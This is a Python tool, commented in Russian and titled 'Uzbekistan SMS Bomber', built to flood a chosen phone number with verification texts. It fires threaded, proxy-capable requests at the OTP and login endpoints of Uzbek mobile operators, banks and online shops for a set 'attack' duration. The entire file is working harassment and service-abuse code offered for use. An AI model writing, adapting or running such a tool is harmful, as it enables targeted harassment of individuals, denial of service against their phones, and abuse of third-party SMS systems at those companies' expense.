import requests
import threading
import time
import random
import sys
from urllib.parse import quote

class UZSMSBomber:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        self.proxies = []
        self.running = False
        
    def load_proxies(self):
        """Загрузка бесплатных прокси (опционально)"""
        try:
            proxy_list = [
                # Добавьте свои прокси или оставьте пустым
            ]
            self.proxies = proxy_list
        except:
            self.proxies = []
    
    def get_proxy(self):
        if not self.proxies:
            return None
        return random.choice(self.proxies)
    
    def send_sms_beeline(self, phone):
        """Beeline SMS"""
        urls = [
            f"https://uzreport.uz/api/sms_send?phone={phone}",
            f"https://beeline.uz/api/auth/sms?phone={phone}",
            f"https://my.beeline.uz/api/v1/sms?phone={phone}"
        ]
        for url in urls:
            try:
                proxy = self.get_proxy()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                self.session.get(url, timeout=5, proxies=proxies)
            except:
                pass
    
    def send_sms_ucell(self, phone):
        """Ucell SMS"""
        urls = [
            f"https://ucell.uz/api/otp?phone={phone}",
            f"https://my.ucell.uz/api/v2/auth/sms?phone={phone}",
            f"https://auth.ucell.uz/send?phone={phone}"
        ]
        for url in urls:
            try:
                proxy = self.get_proxy()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                self.session.post(url, timeout=5, proxies=proxies)
            except:
                pass
    
    def send_sms_uzmobile(self, phone):
        """UZMobile SMS"""
        urls = [
            f"https://uzmobile.uz/api/sms/verify?phone={phone}",
            f"https://my.uzmobile.uz/api/auth/otp?phone={phone}",
            f"https://lk.uzmobile.uz/api/send-sms?phone={phone}"
        ]
        for url in urls:
            try:
                proxy = self.get_proxy()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                self.session.get(url, timeout=5, proxies=proxies)
            except:
                pass
    
    def send_sms_m1(self, phone):
        """M1 SMS"""
        urls = [
            f"https://m1.uz/api/sms-send?phone={phone}",
            f"https://lk.m1.uz/api/otp?phone={phone}"
        ]
        for url in urls:
            try:
                proxy = self.get_proxy()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                self.session.post(url, timeout=5, proxies=proxies)
            except:
                pass
    
    def send_sms_banks(self, phone):
        """Банковские SMS"""
        bank_urls = [
            f"https://click.uz/api/auth/sms?phone={phone}",
            f"https://kapitalbank.uz/api/otp?phone={phone}",
            f"https://anorbank.uz/api/sms-verify?phone={phone}",
            f"https://ipay.uz/api/auth/otp?phone={phone}",
            f"https://hamkorbank.uz/api/sms?phone={phone}"
        ]
        for url in bank_urls:
            try:
                proxy = self.get_proxy()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                self.session.get(url, timeout=5, proxies=proxies)
            except:
                pass
    
    def send_sms_shops(self, phone):
        """Интернет-магазины и сервисы"""
        shop_urls = [
            f"https://olx.uz/api/sms?phone={phone}",
            f"https://uzum.uz/api/auth/otp?phone={phone}",
            f"https://zoodmall.uz/api/sms-verify?phone={phone}",
            f"https://wildberries.uz/api/otp?phone={phone}",
            f"https://asaxiy.uz/api/auth/sms?phone={phone}"
        ]
        for url in shop_urls:
            try:
                proxy = self.get_proxy()
                proxies = {'http': proxy, 'https': proxy} if proxy else None
                self.session.post(url, timeout=5, proxies=proxies)
            except:
                pass
    
    def attack(self, phone, threads=50, duration=60):
        """Основная функция атаки"""
        self.running = True
        phone = phone.replace('+', '').replace(' ', '').replace('-', '')
        if not phone.startswith('998'):
            phone = '998' + phone[-9:]
        
        print(f"🚀 Запуск SMS Bomber на номер: +{phone}")
        print(f"📊 Потоки: {threads} | Время: {duration}с")
        print("-" * 50)
        
        def worker():
            while self.running:
                try:
                    methods = [
                        self.send_sms_beeline,
                        self.send_sms_ucell, 
                        self.send_sms_uzmobile,
                        self.send_sms_m1,
                        self.send_sms_banks,
                        self.send_sms_shops
                    ]
                    method = random.choice(methods)
                    method(phone)
                    time.sleep(random.uniform(0.1, 0.5))
                except:
                    pass
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            threads_list.append(t)
        
        start_time = time.time()
        while time.time() - start_time < duration:
            print(f"⏱️  Время: {int(time.time() - start_time)}/{duration}с", end='\r')
            time.sleep(1)
        
        self.running = False
        print("\n✅ Атака завершена!")

def main():
    print("🇺🇿 UZBEKISTAN SMS BOMBER v2.0")
    print("=" * 50)
    
    bomber = UZSMSBomber()
    bomber.load_proxies()
    
    while True:
        try:
            phone = input("\n📱 Введите номер (998xx...): ").strip()
            if not phone:
                continue
            
            threads = input("🔥 Кол-во потоков [50]: ").strip()
            threads = int(threads) if threads.isdigit() else 50
            
            duration = input("⏱️  Время атаки (сек) [60]: ").strip()
            duration = int(duration) if duration.isdigit() else 60
            
            bomber.attack(phone, threads, duration)
            
        except KeyboardInterrupt:
            print("\n👋 Выход...")
            sys.exit(0)
        except Exception as e:
            print(f"❌ Ошибка: {e}")
            continue

if __name__ == "__main__":
    main()
